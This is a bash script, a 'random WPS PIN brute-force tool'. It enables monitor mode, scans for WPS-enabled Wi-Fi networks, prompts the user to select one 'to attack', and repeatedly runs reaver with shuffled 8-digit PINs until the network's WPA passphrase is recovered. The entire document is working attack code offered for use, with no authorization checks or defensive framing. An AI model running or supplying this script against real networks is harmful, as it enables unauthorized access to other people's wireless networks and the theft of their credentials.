#!/bin/bash

# === CONFIGURATION ===
REAL_IFACE="wlp0s20f3"                # Your wireless interface
MON_IFACE="${REAL_IFACE}mon"          # Monitor mode interface
PIN_LIST="wps_pins.txt"               # PIN list file
LOG_FILE="wps_crack_$(date +%Y%m%d_%H%M%S).log"  # Time-based log file
SCAN_DURATION=10                      # Scan duration in seconds
REAVER_TIMEOUT=0.5                    # Reaver timeout between attempts
DEFAULT_PIN_LENGTH=8                  # Default PIN length for generation
MAX_ATTEMPTS=10000                    # Maximum number of PIN attempts
SHUFFLED_PINS="/tmp/shuffled_pins.$$" # Temporary file for shuffled PINs

# === FUNCTIONS ===
# Color codes for better user interface
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Error handling function
error_exit() {
    echo -e "${RED}[ERROR] $1${NC}" >&2
    cleanup
    exit 1
}

# Cleanup function to restore network
cleanup() {
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    
    # Remove temporary files
    [ -f "$SHUFFLED_PINS" ] && rm -f "$SHUFFLED_PINS"
    
    # Check if monitor interface exists before trying to remove it
    if ip link show "$MON_IFACE" &> /dev/null; then
        sudo ip link set "$MON_IFACE" down 2>/dev/null
        sudo iw dev "$MON_IFACE" del 2>/dev/null
    fi
    
    # Restore the original interface
    sudo ip link set "$REAL_IFACE" down 2>/dev/null
    sudo iw "$REAL_IFACE" set type managed 2>/dev/null
    sudo ip link set "$REAL_IFACE" up 2>/dev/null
    
    # Restart NetworkManager if available
    if systemctl is-active --quiet NetworkManager; then
        sudo systemctl restart NetworkManager 2>/dev/null
    fi
    
    echo -e "${GREEN}[+] Network interface restored: $REAL_IFACE${NC}"
}

# Check for required tools
check_dependencies() {
    local tools=("airmon-ng" "iw" "wash" "reaver" "crunch" "shuf")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        error_exit "Missing required tools: ${missing[*]}"
    fi
}

# Generate PIN list if needed
generate_pin_list() {
    if [[ ! -f "$PIN_LIST" ]]; then
        echo -e "${YELLOW}[*] Generating $DEFAULT_PIN_LENGTH-digit PIN list...${NC}"
        crunch $DEFAULT_PIN_LENGTH $DEFAULT_PIN_LENGTH 0123456789 -o "$PIN_LIST" || \
        error_exit "Failed to generate PIN list"
        echo -e "${GREEN}[+] PIN list generated: $PIN_LIST${NC}"
    else
        echo -e "${GREEN}[+] Using existing PIN list: $PIN_LIST${NC}"
    fi
}

# Shuffle PINs for random attempts
shuffle_pins() {
    echo -e "${YELLOW}[*] Shuffling PINs for random attempts...${NC}"
    shuf "$PIN_LIST" > "$SHUFFLED_PINS" || error_exit "Failed to shuffle PINs"
    echo -e "${GREEN}[+] PINs shuffled and ready for random attempts${NC}"
}

# Enable monitor mode
enable_monitor_mode() {
    echo -e "${YELLOW}[*] Enabling monitor mode on $REAL_IFACE...${NC}"
    
    # Kill conflicting processes
    sudo airmon-ng check kill > /dev/null 2>&1
    
    # Create monitor interface
    sudo ip link set "$REAL_IFACE" down || error_exit "Could not bring down $REAL_IFACE"
    sudo iw "$REAL_IFACE" set monitor control || error_exit "Could not set monitor mode"
    sudo ip link set "$REAL_IFACE" up || error_exit "Could not bring up $REAL_IFACE"
    sudo iw dev "$REAL_IFACE" interface add "$MON_IFACE" type monitor || \
        error_exit "Could not create monitor interface"
    sudo ip link set "$MON_IFACE" up || error_exit "Could not bring up $MON_IFACE"
    
    echo -e "${GREEN}[+] Monitor mode enabled: $MON_IFACE${NC}"
}

# Scan for WPS-enabled networks
scan_networks() {
    echo -e "${YELLOW}[*] Scanning for WPS-enabled networks (${SCAN_DURATION} seconds)...${NC}"
    
    # Start wash in background
    timeout $SCAN_DURATION sudo wash -i "$MON_IFACE" -s > wash_output.txt 2>&1
    
    # Count found networks
    local count=$(awk 'NR>2' wash_output.txt | wc -l)
    
    if [ "$count" -eq 0 ]; then
        error_exit "No WPS-enabled networks found"
    fi
    
    echo
    echo -e "${BLUE}====== WPS-Enabled Networks Found ======${NC}"
    awk 'NR>2 {printf "%2d) %-18s | CH: %2s | Signal: %3s | ESSID: %s\n", NR-2, $1, $2, $3, substr($0, index($0,$6))}' wash_output.txt
    echo
}

# Get user target selection
select_target() {
    local max_choice=$(awk 'NR>2' wash_output.txt | wc -l)
    
    while true; do
        read -p "[?] Enter number of the network to attack (1-$max_choice): " CHOICE
        
        # Validate input
        if [[ "$CHOICE" =~ ^[0-9]+$ ]] && [ "$CHOICE" -ge 1 ] && [ "$CHOICE" -le "$max_choice" ]; then
            break
        else
            echo -e "${RED}Invalid selection. Please enter a number between 1 and $max_choice.${NC}"
        fi
    done
    
    TARGET_LINE=$(awk "NR==$((CHOICE+2))" wash_output.txt)
    BSSID=$(echo "$TARGET_LINE" | awk '{print $1}')
    CHANNEL=$(echo "$TARGET_LINE" | awk '{print $2}')
    ESSID=$(echo "$TARGET_LINE" | cut -d ' ' -f6-)
    
    echo -e "${GREEN}[*] Selected: $ESSID${NC}"
    echo -e "${BLUE}[+] BSSID: $BSSID${NC}"
    echo -e "${BLUE}[+] Channel: $CHANNEL${NC}"
    echo
}

# Run Reaver attack with random PINs
run_reaver_random() {
    echo -e "${YELLOW}[*] Starting WPS PIN brute-force with random attempts on $BSSID${NC}"
    echo "Target: $ESSID ($BSSID) on CH $CHANNEL" > "$LOG_FILE"
    echo "Started at: $(date)" >> "$LOG_FILE"
    echo "Random PIN attempts:" >> "$LOG_FILE"
    
    local success=0
    local attempt=0
    local total_pins=$(wc -l < "$SHUFFLED_PINS")
    local pins_to_try=$((total_pins < MAX_ATTEMPTS ? total_pins : MAX_ATTEMPTS))
    
    while [ $attempt -lt $pins_to_try ]; do
        attempt=$((attempt + 1))
        PIN=$(sed -n "${attempt}p" "$SHUFFLED_PINS")
        
        echo -e "${YELLOW}[+] Attempt $attempt/$pins_to_try: Trying PIN: $PIN${NC}"
        echo "Attempt $attempt: PIN $PIN" >> "$LOG_FILE"
        
        # Run reaver with timeout and capture output
        timeout 30 sudo reaver -i "$MON_IFACE" -b "$BSSID" -c "$CHANNEL" -p "$PIN" -vv -N -T $REAVER_TIMEOUT 2>&1 | tee -a "$LOG_FILE" | grep -q "WPA PSK"
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✔] SUCCESS: WPS PIN $PIN worked!${NC}" | tee -a "$LOG_FILE"
            success=1
            break
        fi
        
        # Small random delay between attempts (0.5-2 seconds)
        sleep $(awk -v min=0.5 -v max=2 'BEGIN{srand(); print min+rand()*(max-min)}')
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}[✖] No valid PIN found after $attempt attempts${NC}" | tee -a "$LOG_FILE"
    fi
    
    echo "[*] Finished at: $(date)" >> "$LOG_FILE"
    echo -e "${GREEN}[+] Log saved to: $LOG_FILE${NC}"
}

# === MAIN SCRIPT ===
trap cleanup EXIT  # Ensure cleanup runs on script exit

echo -e "${BLUE}"
echo "========================================"
echo "     RANDOM WPS PIN BRUTE-FORCE TOOL    "
echo "========================================"
echo -e "${NC}"

# Check dependencies first
check_dependencies

# Generate PIN list if needed
generate_pin_list

# Shuffle PINs for random attempts
shuffle_pins

# Enable monitor mode
enable_monitor_mode

# Scan for networks
scan_networks

# Select target
select_target

# Run the attack with random PINs
run_reaver_random

exit 0
